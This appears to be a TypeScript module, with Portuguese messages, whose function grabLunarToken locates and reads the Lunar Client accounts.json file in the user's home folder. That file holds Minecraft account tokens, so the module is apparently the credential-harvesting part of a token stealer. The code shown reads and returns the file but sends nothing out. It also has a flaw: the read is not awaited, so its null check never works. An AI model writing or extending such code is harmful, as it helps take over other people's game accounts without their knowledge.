import { readFile } from 'node:fs/promises';
import path from "node:path";
import os from "node:os";

export async function grabLunarToken(): Promise<string>{
    try{
        const caminho =  path.join(os.homedir(),'.lunarclient','settings','game','accounts.json');
        console.log(`path pro lunar: ${caminho}`);

        
        const lunarJson = readFile(caminho, {encoding: 'utf-8'});

        if(!lunarJson){
            throw new Error("não achou a bomba do lunar json");
        }

        return lunarJson;
    
    
    }catch(error){
        throw new Error(`deu erro aqui: ${error}`);
    }

}

